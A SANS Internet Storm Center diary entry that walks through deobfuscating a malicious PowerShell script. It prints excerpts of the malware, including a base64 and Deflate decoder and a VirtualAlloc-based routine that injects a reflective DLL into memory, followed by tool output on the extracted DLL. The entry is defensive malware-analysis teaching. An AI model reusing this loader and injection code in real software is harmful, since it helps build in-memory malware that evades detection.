---
title: Bypassing PowerShell Strong Obfuscation, (Thu, Mar 30th)
url: https://isc.sans.edu/diary/rss/29692
source: SANS Internet Storm Center, InfoCON: green
date: 2023-03-31
fetch_date: 2025-10-04T11:17:44.886887
---

# Bypassing PowerShell Strong Obfuscation, (Thu, Mar 30th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/29688)
* [next](/diary/29696)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [Bypassing PowerShell Strong Obfuscation](/forums/diary/Bypassing%2BPowerShell%2BStrong%2BObfuscation/29692/)

**Published**: 2023-03-30. **Last Updated**: 2023-03-30 07:40:48 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[1 comment(s)](/diary/Bypassing%2BPowerShell%2BStrong%2BObfuscation/29692/#comments)

Yesterday, I found a malicious PowerShell script that was heavily obfuscated. The filename is “B0A4.ps1"[[1](http://bazaar.abuse.ch/sample/b4814c8db16ecdd7904e81186715bf2a4b4ba28ef5853a41a8f59824f47f8f24/)] (SHA256:b4814c8db16ecdd7904e81186715bf2a4b4ba28ef5853a41a8f59824f47f8f24), reported with a very low score on VirusTotal: 6/58. The file size is abnormal for a script like this (496KB). A first look at it reveals that it has been strongly obfuscated:

```

Set-StrictMode -Version 2

function fZbO
{
$nIQwY=LUHF u P 5 r s n a / h 7 w
$DED6=IcvBw 0 o V C 7 '2' 5 H H
$iUFxY=ItwnJ l j z E R n D n w
$cxQYE8=vmijz 6 L w c R 4 '1'
$oAOe=SvowPc L V 3 c m 0 K 3 K
$cG6n05=EHjwCm '6' 3 v 6 F g E u v 5
$GjD=ZlTg T p b j T 4 + x
$oAOe+$iUFxY+$cxQYE8+$cG6n05+$DED6+$nIQwY+$GjD
}
function YIPdR
{
TrzF (DdOL) (bDgNo) (jzgg) (Tkdr) (CMFi) (FlILs)
...
```

The script is based on a multitude of small functions:

```

remnux@remnux:/MalwareZoo/20230329$ grep function B0A4.ps1 | wc -l
2256
```

Obfuscation techniques are often frustrating. If you’re working on an incident, you don’t have time to investigate everything and understand how they work from A to Z. Especially if it’s a nice one like the above. You need to understand what the script will perform as soon as possible and move forward. My advice is to start reversing from the 1st called function.

Here, the script last line is a call to the function ‘KvcsVo’:

```

function KvcsVo
{
$sYrJ=(MJFr)
$A12J8=46384
$hyM8Hj=128512
$A1p=[System.Convert]::FromBase64String($sYrJ)
$G9Ycm=hCsN $A1p
$k9V=qoLLFT $hyM8Hj
$yWLdo=$G9Ycm.Read($k9V, 0, $hyM8Hj)
WSmgh $k9V $A12J8
}
```

Bingo, we can read “FromBase64String”. Load the script in a PowerShell debugger to speed up the analysis. Microsoft provides a debugger in the “PowerShell ISE” tool. Search for FromBase64String and set a breakpoint:

![](https://isc.sans.edu/diaryimages/images/isc-20230330-1.png)

Once the breakpoint is reached, we can dump the content of variables, and after a few "step into", you will understand what will happen. The payload is deobfuscated:

```

function hCsN
{
Param ($EypP)
New-Object IO.Compression.DeflateStream([IO.MemoryStream][Byte[]]$EypP,[IO.Compression.CompressionMode]::Decompress)
}
```

Now, on the following line, the variable '$k9V' will contain the payload that will probably be injected in memory:

```

WSmgh $k9V $A12J8
```

Indeed:

```

function WSmgh
{
Param ($ikJ1M,$EyS5sM)
$cCio=OAUdti
$daz=$cCio.Invoke([IntPtr]::Zero, $ikJ1M.Length+0,0x3000, 0x40)
$GSyjgL=yzMfZ $ikJ1M $daz
$t0CnJl=qgJC
$I0zg=$t0CnJl.Invoke([IntPtr]::Zero,0,[Int64]$daz+$EyS5sM,[IntPtr]::Zero,0,[IntPtr]::Zero)
$SbWY=isBl
$wyFU=$SbWY.Invoke($I0zg, 0xffffffff) | Out-Null
}
```

You recognise the classic parameter for a VirtualAlloc() call with the 0x40 (PAGE\_EXECUTE\_READWRITE). We can also find in the script code related to Assemblies to inject the payload in memory.

'$k9V' can now be dumped into a file, and we have a brand new DLL to investigate:

```

remnux@remnux:/MalwareZoo/20230329$ peframe payload.dll
--------------------------------------------------------------------------------
File Information (time: 0:00:20.881379)
--------------------------------------------------------------------------------
filename         payload.dll
filetype         PE32+ executable (DLL) (GUI) x86-64, for MS Windows
filesize         128512
hash sha256      bbf6413bd1c156ae4569ec8ca3c8d803e8739405f3348a9713ab4149afcf0363
virustotal       /
imagebase        0x180000000 *
entrypoint       0x2bd8
imphash          67338adb4c5d3b6e6f876d5ca7678226
datetime         2020-11-12 13:11:45
dll              True
directories      import, export, tls, resources, relocations
sections         .rdata, .data, .pdata, .rsrc, .reloc, .text *
features         packer

--------------------------------------------------------------------------------
Yara Plugins
--------------------------------------------------------------------------------
IsPE64
IsDLL
IsWindowsGUI
HasRichSignature

--------------------------------------------------------------------------------
Behavior
--------------------------------------------------------------------------------
Xor

--------------------------------------------------------------------------------
Packer
--------------------------------------------------------------------------------
Microsoft Visual Cpp 80 DLL

--------------------------------------------------------------------------------
Sections Suspicious
--------------------------------------------------------------------------------
.text            6.32

--------------------------------------------------------------------------------
Import function
--------------------------------------------------------------------------------
KERNEL32.dll     4
ADVAPI32.dll     2

--------------------------------------------------------------------------------
Export function
--------------------------------------------------------------------------------
export           [{'offset': 6442500400, 'function': 'ReflectiveLoader'}]
```

The DLL[[2](https://bazaar.abuse.ch/sample/bbf6413bd1c156ae4569ec8ca3c8d803e8739405f3348a9713ab4149afcf0363/)] was pretty old and uploaded on VirusTotal in June 2021! I tried to detonate it in my sandbox, but no activity was detected.

[1] <https://bazaar.abuse.ch/sample/b4814c8db16ecdd7904e81186715bf2a4b4ba28ef5853a41a8f59824f47f8f24/>
[2] <https://bazaar.abuse.ch/sample/bbf6413bd1c156ae4569ec8ca3c8d803e8739405f3348a9713ab4149afcf0363/>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Malware](/tag.html?tag=Malware) [Obfuscation](/tag.html?tag=Obfuscation) [PowerShell](/tag.html?tag=PowerShell)

[1 comment(s)](/diary/Bypassing%2BPowerShell%2BStrong%2BObfuscation/29692/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/29688)
* [next](/diary/29696)

### Comments

Hey Xavier,

I'm still learning about malware analysis. Can you us how to you dumped the variable into a file?

"'$k9V' can now be dumped into a file"

Thank you!

#### Zikum

#### Mar 31st 2023 2 years ago

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html...